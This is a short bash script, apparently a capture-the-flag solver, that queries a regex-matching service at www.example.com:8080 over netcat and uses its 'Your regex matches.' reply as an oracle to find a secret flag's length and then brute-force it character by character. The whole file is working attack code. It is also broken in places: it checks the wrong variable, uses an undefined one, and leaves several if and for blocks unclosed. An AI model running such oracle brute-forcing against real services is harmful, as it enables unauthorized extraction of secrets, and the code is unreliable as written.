results="Your regex matches."
host="www.example.com"
port="8080"

#grep everything
result0=$(echo '.*' | nc -w 1 $host $port | grep -oE "$regex");
  if [ ! -z "$result1" ]
  then
    echo "Regex succeded"

#grep charachter number
for no in {34..37}; 
do 
  result1=$(echo ".{"$no"}" | nc -w 1 $host $port | grep -oE "$results");
  if [ ! -z "$result1" ]
  then
    echo ""Word Count: "$no" >> test.txt
    test=$(yes .|head -$no|tr -d '\n');
    #word count
    count1=$(($no - 1));
    loop=$(echo "0.."$count1"");
    for count2 in $(seq 0 $count1 );
    do
      for char1 in $(cat charset.txt); do
        code=$(echo "s/\(.\{"$count2"\}\)./\1"$char1"/");
        result1=$(echo "$test" | sed $code | nc -w 1 $host $port | grep -oE "$results");
        if [ ! -z "$result1" ]
        then
          check=$(cat test.txt | grep "flag:");
          if [ -z "$check" ]
          then
            echo "flag: " >> test.txt
          fi
          echo "Results being stored in text file"
          sed -i "$ s/$/"$char1"/" test.txt
          break;
        fi
      done
